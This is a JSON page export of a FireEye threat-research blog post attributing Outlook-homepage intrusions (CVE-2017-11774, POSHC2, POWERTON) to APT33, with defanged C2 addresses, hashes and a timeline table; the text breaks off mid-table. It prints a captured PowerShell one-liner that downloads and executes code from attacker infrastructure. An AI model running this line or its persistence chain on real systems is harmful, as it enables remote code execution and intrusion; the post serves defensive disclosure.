{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Fri Dec 21 2018 14:16:11 GMT-0500",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "OVERRULED: Containing a Potentially Destructive Adversary",
    "twitterSize": "small",
    "cq:lastReplicationAction": "Activate",
    "jcr:versionHistory": "77d4fd8a-aae2-4063-914a-cc4e27a55c82",
    "author": "Geoff Ackerman",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "cq:lastReplicatedBy": "adam.greenberg@fireeye.com",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "c147b7cd-e8c8-4a7d-9003-f7c022bcb987"
    ],
    "jcr:created": "Wed Jul 03 2019 16:55:01 GMT-0400",
    "cq:lastReplicated": "Wed Jul 03 2019 16:55:01 GMT-0400",
    "cq:lastModified": "Wed Jul 03 2019 16:54:18 GMT-0400",
    "jcr:baseVersion": "c147b7cd-e8c8-4a7d-9003-f7c022bcb987",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:geoff-ackerman",
      "fireeye-blog-authors:rick-cole",
      "fireeye-blog-authors:andrew-thompson",
      "fireeye-blog-authors:alex-orleans",
      "fireeye-blog-authors:nick-carr",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:apt",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest"
    ],
    "jcr:uuid": "5376f336-2ede-4044-9352-f3a0a3464d5b",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Fri Dec 21 2018 14:00:00 GMT-0500",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "text": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:createdBy": "adam.greenberg@fireeye.com",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "jcr:created": "Wed Jul 03 2019 16:52:50 GMT-0400",
        "text": "\u003Cp\u003E\u003Ci\u003EUPDATE (Jul. 3, 2019):\u0026nbsp;On May 16, 2019 FireEye\u0027s Advanced Practices team attributed the remaining \u0026quot;suspected APT33 activity\u0026quot; (referred to as GroupB in this blog post) to APT33, operating at the behest of the Iranian government. The malware and tradecraft in this blog post are\u0026nbsp;consistent with the\u0026nbsp;\u003Ca href=\u0022https:\/\/twitter.com\/FireEye\/status\/1141803688316608517?s=20\u0022\u003EJune 2019 intrusion campaign\u003C\/a\u003E\u0026nbsp;targeting U.S. federal government agencies and financial, retail, media, and education sectors\u0026nbsp;\u2013 as well as\u0026nbsp;\u003Ca href=\u0022https:\/\/twitter.com\/CNMF_VirusAlert\/status\/1146130046127681536?s=20\u0022\u003EU.S. Cyber Command\u0027s July 2019 CVE-2017-11774 indicators\u003C\/a\u003E, which FireEye also attributes to APT33.\u0026nbsp;FireEye\u0027s rigorous process for clustering and attributing this activity is also explored in this blog\u0027s \u0026quot;Identifying the Overlap\u0026quot; section.\u003C\/i\u003E\u003C\/p\u003E\n",
        "jcr:lastModified": "Wed Jul 03 2019 16:54:18 GMT-0400",
        "sling:resourceType": "fireeye-www\/fdc\/components\/text\/text",
        "textIsRich": "true"
      },
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Ch4\u003EIntroduction\u003C\/h4\u003E\n\u003Cp\u003EFireEye assesses APT33 may be behind a series of intrusions and attempted intrusions within the engineering industry. Public reporting indicates this activity may be related to recent destructive attacks. FireEye\u0027s \u003Ca href=\u0022https:\/\/www.fireeye.com\/solutions\/managed-defense.html\u0022\u003EManaged Defense\u003C\/a\u003E has responded to and contained numerous intrusions that we assess are related. The actor is leveraging publicly available tools in early phases of the intrusion; however, we have observed them transition to custom implants in later stage activity in an attempt to circumvent our detection.\u003C\/p\u003E\n\u003Cp\u003EOn Sept. 20, 2017, FireEye Intelligence published a blog post detailing spear phishing activity \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2017\/09\/apt33-insights-into-iranian-cyber-espionage.html\u0022\u003Etargeting Energy and Aerospace industries\u003C\/a\u003E. Recent public reporting indicated possible links between the confirmed APT33 spear phishing and \u003Ca href=\u0022https:\/\/securingtomorrow.mcafee.com\/other-blogs\/mcafee-labs\/shamoon-attackers-employ-new-tool-kit-to-wipe-infected-systems\/\u0022\u003Edestructive SHAMOON attacks\u003C\/a\u003E; however, we were unable to independently verify this claim. FireEye\u2019s Advanced Practices team leverages telemetry and aggressive proactive operations to maintain visibility of APT33 and their attempted intrusions against our customers. These efforts enabled us to establish an operational timeline that was consistent with multiple intrusions Managed Defense identified and contained prior to the actor completing their mission. We correlated the intrusions using an internally-developed similarity engine described below. Additionally, public discussions have also indicated that specific attacker infrastructure we observed is possibly related to the recent destructive SHAMOON attacks.\u003C\/p\u003E\n\u003Cblockquote class=\u0022twitter-tweet tw-align-center\u0022 data-lang=\u0022en\u0022\u003E\u003Cp lang=\u0022en\u0022 dir=\u0022ltr\u0022\u003E45 days ago, during 24x7 monitoring, \u003Ca href=\u0022https:\/\/twitter.com\/hashtag\/ManagedDefense?src=hash\u0026amp;ref_src=twsrc%5Etfw\u0022\u003E#ManagedDefense\u003C\/a\u003E detected \u0026amp; contained an attempted intrusion from newly-identified adversary infrastructure*.\u003Cbr\u003E\u003Cbr\u003EIt is C2 for a code family we track as POWERTON.\u003Cbr\u003E\u003Cbr\u003E*hxxps:\/\/103.236.149[.]100\/api\/info\u003C\/p\u003E\u0026mdash; FireEye (@FireEye) \u003Ca href=\u0022https:\/\/twitter.com\/FireEye\/status\/1073744224510722048?ref_src=twsrc%5Etfw\u0022\u003EDecember 15, 2018\u003C\/a\u003E\u003C\/blockquote\u003E\n\u003Cscript async src=\u0022https:\/\/platform.twitter.com\/widgets.js\u0022 charset=\u0022utf-8\u0022\u003E\u003C\/script\u003E\n\u003Ch4\u003EIdentifying the Overlap in Threat Activity\u003C\/h4\u003E\n\u003Cp\u003EFireEye augments our expertise with an \u003Ca href=\u0022https:\/\/www.camlis.org\/matthew-berninger\/\u0022\u003Einternally-developed similarity engine\u003C\/a\u003E to evaluate potential associations and relationships between groups and activity. Using concepts from document clustering and topic modeling literature, this engine provides a framework to calculate and discover similarities between groups of activities, and then develop investigative leads for follow-on analysis. Our engine identified similarities between a series of intrusions within the engineering industry. The near real-time results led to an in-depth comparative analysis. FireEye analyzed all available organic information from numerous intrusions and all known APT33 activity. We subsequently concluded, with medium confidence, that two specific early-phase intrusions were the work of a single group. Advanced Practices then reconstructed an operational timeline based on confirmed APT33 activity observed in the last year. We compared that to the timeline of the contained intrusions and determined there were circumstantial overlaps to include remarkable similarities in tool selection during specified timeframes. We assess with low confidence that the intrusions were conducted by APT33. This blog contains original source material only, whereas Finished Intelligence including an all-source analysis is \u003Ca href=\u0022https:\/\/intelligence.fireeye.com\/reports\/18-00021316\u0022\u003Eavailable within our intelligence portal\u003C\/a\u003E. To best understand the techniques employed by the adversary, it is necessary to provide background on our Managed Defense response to this activity during their 24x7 monitoring.\u003C\/p\u003E\n\u003Ch4\u003EManaged Defense Rapid Responses: Investigating the Attacker\u003C\/h4\u003E\n\u003Cp\u003EIn mid-November 2017, Managed Defense identified and responded to targeted threat activity at a customer within the engineering industry. The adversary leveraged stolen credentials and a publicly available tool, SensePost\u2019s \u003Ca href=\u0022https:\/\/github.com\/sensepost\/ruler\u0022\u003ERULER\u003C\/a\u003E, to configure a client-side mail rule crafted to download and execute a malicious payload from an adversary-controlled WebDAV server \u003Cspan class=\u0022code\u0022\u003E85.206.161[.]214@443\\outlook\\live.exe \u003C\/span\u003E(MD5: \u003Ci\u003E95f3bea43338addc1ad951cd2d42eb6f\u003C\/i\u003E).\u003C\/p\u003E\n\u003Cp\u003EThe payload was an AutoIT downloader that retrieved and executed additional PowerShell from \u003Cspan class=\u0022code\u0022\u003Ehxxps:\/\/85.206.161[.]216:8080\/HomePage.htm\u003C\/span\u003E. The follow-on PowerShell profiled the target system\u2019s architecture, downloaded the appropriate variant of PowerSploit (MD5: \u003Ci\u003Ec326f156657d1c41a9c387415bf779d4\u003C\/i\u003E or \u003Ci\u003E0564706ec38d15e981f71eaf474d0ab8\u003C\/i\u003E), and reflectively loaded PUPYRAT (MD5: \u003Ci\u003E94cd86a0a4d747472c2b3f1bc3279d77\u003C\/i\u003E or \u003Ci\u003E17587668AC577FCE0B278420B8EB72AC\u003C\/i\u003E). The actor leveraged a publicly available exploit for CVE-2017-0213 to escalate privileges, publicly available Windows SysInternals PROCDUMP to dump the LSASS process, and publicly available MIMIKATZ to presumably steal additional credentials. Managed Defense aided the victim in containing the intrusion.\u003C\/p\u003E\n\u003Cp\u003EFireEye collected 168 PUPYRAT samples for a comparison. While import hashes (IMPHASH) are insufficient for attribution, we found it remarkable that out of the specified sampling, the actor\u2019s IMPHASH was found in only six samples, two of which were confirmed to belong to the threat actor observed in Managed Defense, and one which is attributed to APT33. We also determined APT33 likely transitioned from PowerShell EMPIRE to PUPYRAT during this timeframe.\u003C\/p\u003E\n\u003Cp\u003EIn mid-July of 2018, Managed Defense identified similar targeted threat activity focused against the same industry. The actor leveraged stolen credentials and RULER\u2019s module that exploits CVE-2017-11774 (RULER.HOMEPAGE), modifying numerous users\u2019 Outlook client homepages for code execution and persistence. These methods are further explored in this post in the \u0026quot;RULER In-The-Wild\u0026quot; section.\u003C\/p\u003E\n\u003Cp\u003EThe actor leveraged this persistence mechanism to download and execute OS-dependent variants of the publicly available .NET POSHC2 backdoor as well as a newly identified PowerShell-based implant self-named POWERTON. Managed Defense rapidly engaged and successfully contained the intrusion. Of note, Advanced Practices separately established that APT33 began using POSHC2 as of at least July 2, 2018, and continued to use it throughout the duration of 2018.\u003C\/p\u003E\n\u003Cp\u003EDuring the July activity, Managed Defense observed three variations of the homepage exploit hosted at \u003Cspan class=\u0022code\u0022\u003Ehxxp:\/\/91.235.116[.]212\/index.html\u003C\/span\u003E. One example is shown in Figure 1.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/OVERRULED\/Picture1.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: Attacker\u2019s homepage exploit (CVE-2017-11774)\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe main encoded payload within each exploit leveraged WMIC to conduct system profiling in order to determine the appropriate OS-dependent POSHC2 implant and dropped to disk a PowerShell script named \u201cMedia.ps1\u201d within the user\u2019s \u003Cspan class=\u0022code\u0022\u003E%LOCALAPPDATA%\u003C\/span\u003E directory (\u003Cspan class=\u0022code\u0022\u003E%LOCALAPPDATA%\\MediaWs\\Media.ps1\u003C\/span\u003E) as shown in Figure 2.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/OVERRULED\/Picture2.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Attacker\u2019s \u201cMedia.ps1\u201d script\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe purpose of \u201c\u003Cspan class=\u0022code\u0022\u003EMedia.ps1\u003C\/span\u003E\u201d was to decode and execute the downloaded binary payload, which was written to disk as \u201c\u003Cspan class=\u0022code\u0022\u003EC:\\Users\\Public\\Downloads\\log.dat\u003C\/span\u003E\u201d. At a later stage, this PowerShell script would be configured to persist on the host via a registry Run key.\u003C\/p\u003E\n\u003Cp\u003EAnalysis of the \u201c\u003Cspan class=\u0022code\u0022\u003Elog.dat\u003C\/span\u003E\u201d payloads determined them to be variants of the publicly available POSHC2 proxy-aware stager written to download and execute PowerShell payloads from a hardcoded command and control (C2) address. These particular POSHC2 samples run on the .NET framework and dynamically load payloads from Base64 encoded strings. The implant will send a reconnaissance report via HTTP to the C2 server (\u003Cspan class=\u0022code\u0022\u003Ehxxps:\/\/51.254.71[.]223\/images\/static\/content\/\u003C\/span\u003E) and subsequently evaluate the response as PowerShell source code. The reconnaissance report contains the following information:\u003C\/p\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli\u003EUsername and domain\u003C\/li\u003E\n\u003Cli\u003EComputer name\u003C\/li\u003E\n\u003Cli\u003ECPU details\u003C\/li\u003E\n\u003Cli\u003ECurrent exe PID\u003C\/li\u003E\n\u003Cli\u003EConfigured C2 server\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EThe C2 messages are encrypted via AES using a hardcoded key and encoded with Base64. It is this POSHC2 binary that established persistence for the aforementioned \u201c\u003Cspan class=\u0022code\u0022\u003EMedia.ps1\u003C\/span\u003E\u201d PowerShell script, which then decodes and executes the POSHC2 binary upon system startup. During the identified July 2018 activity, the POSHC2 variants were configured with a kill date of July 29, 2018.\u003C\/p\u003E\n\u003Cp\u003EPOSHC2 was leveraged to download and execute a new PowerShell-based implant self-named POWERTON (\u003Cspan class=\u0022code\u0022\u003Ehxxps:\/\/185.161.209[.]172\/api\/info\u003C\/span\u003E)\u003Ci\u003E. \u003C\/i\u003EThe adversary had limited success with interacting with POWERTON during this time.\u0026nbsp; The actor was able to download and establish persistence for an AutoIt binary named \u201c\u003Cspan class=\u0022code\u0022\u003EClouldPackage.exe\u003C\/span\u003E\u201d (MD5: 46038aa5b21b940099b0db413fa62687), which was achieved via the POWERTON \u201cpersist\u201d command. The sole functionality of \u201c\u003Cspan class=\u0022code\u0022\u003EClouldPackage.exe\u003C\/span\u003E\u201d was to execute the following line of PowerShell code:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; $webclient = new-object System.Net.WebClient; $webclient.Credentials = new-object System.Net.NetworkCredential(\u0027public\u0027, \u0027fN^4zJp{5w#K0VUm}Z_a!QXr*]\u0026amp;2j8Ye\u0027); iex $webclient.DownloadString(\u0027hxxps:\/\/185.161.209[.]172\/api\/default\u0027)\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe purpose of this code is to retrieve \u201csilent mode\u201d POWERTON from the C2 server. Note the actor protected their follow-on payloads with strong credentials. Shortly after this, Managed Defense contained the intrusion.\u003C\/p\u003E\n\u003Cp\u003EStarting approximately three weeks later, the actor reestablished access through a successful password spray. Managed Defense immediately identified the actor deploying malicious homepages with RULER to persist on workstations. They made some infrastructure and tooling changes to include additional layers of obfuscation in an attempt to avoid detection. The actor hosted their homepage exploit at a new C2 server (\u003Cspan class=\u0022code\u0022\u003Ehxxp:\/\/5.79.66[.]241\/index.html\u003C\/span\u003E). At least three new variations of \u201c\u003Cspan class=\u0022code\u0022\u003Eindex.html\u003C\/span\u003E\u201d were identified during this period. Two of these variations contained encoded PowerShell code written to download new OS-dependent variants of the .NET POSHC2 binaries, as seen in Figure 3.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/OVERRULED\/Picture3.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: OS-specific POSHC2 Downloader\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 3 shows that the actor made some minor changes, such as encoding the PowerShell \u0026quot;\u003Cspan class=\u0022code\u0022\u003EDownloadString\u003C\/span\u003E\u0026quot; commands and renaming the resulting POSHC2 and .ps1 files dropped to disk. Once decoded, the commands will attempt to download the POSHC2 binaries from yet another new C2 server (\u003Cspan class=\u0022code\u0022\u003Ehxxp:\/\/103.236.149[.]124\/delivered.dat\u003C\/span\u003E). The name of the .ps1 file dropped to decode and execute the POSHC2 variant also changed to \u201c\u003Cspan class=\u0022code\u0022\u003EVision.ps1\u003C\/span\u003E\u201d. \u0026nbsp;During this August 2018 activity, the POSHC2 variants were configured with a \u201ckill date\u201d of Aug. 13, 2018. Note that POSHC2 supports a kill date in order to guardrail an intrusion by time and this functionality is built into the framework.\u003Cb\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Cp\u003EOnce again, POSHC2 was used to download a new variant of POWERTON (MD5: \u003Ci\u003Ec38069d0bc79acdc28af3820c1123e53\u003C\/i\u003E), configured to communicate with the C2 domain \u003Cspan class=\u0022code\u0022\u003Ehxxps:\/\/basepack[.]org\u003C\/span\u003E. At one point in late-August, after the POSHC2 kill date, the adversary used RULER.HOMEPAGE to directly download POWERTON, bypassing the intermediary stages previously observed.\u003Cb\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Cp\u003EDue to Managed Defense\u2019s early containment of these intrusions, we were unable to ascertain the actor\u2019s motivations; however, it was clear they were adamant about gaining and maintaining access to the victim\u2019s network.\u003Cb\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Ch4\u003EAdversary Pursuit: Infrastructure Monitoring\u003C\/h4\u003E\n\u003Cp\u003EAdvanced Practices conducts aggressive proactive operations in order to identify and monitor adversary infrastructure at scale. The adversary maintained a RULER.HOMEPAGE payload at \u003Cspan class=\u0022code\u0022\u003Ehxxp:\/\/91.235.116[.]212\/index.html\u003C\/span\u003E between July 16 and Oct. 11, 2018. On at least Oct. 11, 2018, the adversary changed the payload (MD5: \u003Ci\u003E8be06571e915ae3f76901d52068e3498\u003C\/i\u003E) to download and execute a POWERTON sample from \u003Cspan class=\u0022code\u0022\u003Ehxxps:\/\/103.236.149[.]100\/api\/info\u003C\/span\u003E\u003Ci\u003E \u003C\/i\u003E(MD5: \u003Ci\u003E4047e238bbcec147f8b97d849ef40ce5\u003C\/i\u003E). This specific URL was identified in a \u003Ca href=\u0022https:\/\/twitter.com\/KseProso\/status\/1073169197541281792\u0022\u003Epublic discussion\u003C\/a\u003E as possibly related to recent destructive attacks. We are unable to independently verify this correlation with any organic information we possess.\u003C\/p\u003E\n\u003Cp\u003EOn Dec. 13, 2018, Advanced Practices proactively identified and attributed a malicious RULER.HOMEPAGE payload hosted at \u003Cspan class=\u0022code\u0022\u003Ehxxp:\/\/89.45.35[.]235\/index.html\u003C\/span\u003E (MD5: \u003Ci\u003Ef0fe6e9dde998907af76d91ba8f68a05\u003C\/i\u003E). The payload was crafted to download and execute POWERTON hosted at \u003Cspan class=\u0022code\u0022\u003Ehxxps:\/\/staffmusic[.]org\/transfer\/view\u003C\/span\u003E (MD5: \u003Ci\u003E53ae59ed03fa5df3bf738bc0775a91d9\u003C\/i\u003E).\u003C\/p\u003E\n\u003Cp\u003ETable 1 contains the operational timeline for the activity we analyzed.\u003Cb\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022702\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EDATE\/TIME (UTC)\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ENOTE\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EINDICATOR\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2017-08-15 17:06:59\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EAPT33 \u2013 EMPIRE (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E8a99624d224ab3378598b9895660c890\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2017-09-15 16:49:59\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EAPT33 \u2013 PUPYRAT (Compiled)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E4b19bccc25750f49c2c1bb462509f84e\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2017-11-12 20:42:43\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EGroupA \u2013 AUT2EXE Downloader (Compiled)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E95f3bea43338addc1ad951cd2d42eb6f\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2017-11-14 14:55:14\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EGroupA \u2013 PUPYRAT (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E17587668ac577fce0b278420b8eb72ac\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-01-09 19:15:16\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EAPT33 \u2013 PUPYRAT (Compiled)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E56f5891f065494fdbb2693cfc9bce9ae\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-02-13 13:35:06\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EAPT33 \u2013 PUPYRAT (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E56f5891f065494fdbb2693cfc9bce9ae\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-05-09 18:28:43\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EGroupB \u2013 AUT2EXE (Compiled)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E46038aa5b21b940099b0db413fa62687\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-07-02 07:57:40\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EAPT33 \u2013 POSHC2 (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Efa7790abe9ee40556fb3c5524388de0b\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-07-16 00:33:01\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EGroupB \u2013 POSHC2 (Compiled)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E75e680d5fddbdb989812c7ba83e7c425\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-07-16 01:39:58\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EGroupB \u2013 POSHC2 (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E75e680d5fddbdb989812c7ba83e7c425\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-07-16 08:36:13\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EGroupB \u2013 POWERTON (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E46038aa5b21b940099b0db413fa62687\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-07-31 22:09:25\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EAPT33 \u2013 POSHC2 (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E129c296c363b6d9da0102aa03878ca7f\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-08-06 16:27:05\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EGroupB \u2013 POSHC2 (Compiled)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Efca0ad319bf8e63431eb468603d50eff\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-08-07 05:10:05\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EGroupB \u2013 POSHC2 (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E75e680d5fddbdb989812c7ba83e7c425\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-08-29 18:14:18\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EAPT33 \u2013 POSHC2 (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E5832f708fd860c88cbdc088acecec4ea\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-10-09 16:02:55\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EAPT33 \u2013 POSHC2 (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E8d3fe1973183e1d3b0dbec31be8ee9dd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-10-09 16:48:09\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EAPT33 \u2013 POSHC2 (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E48d1ed9870ed40c224e50a11bf3523f8\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022144\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2018-10-11 21:29:22\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022300\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EGroupB \u2013 POWERTON (Used)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022258\u0022 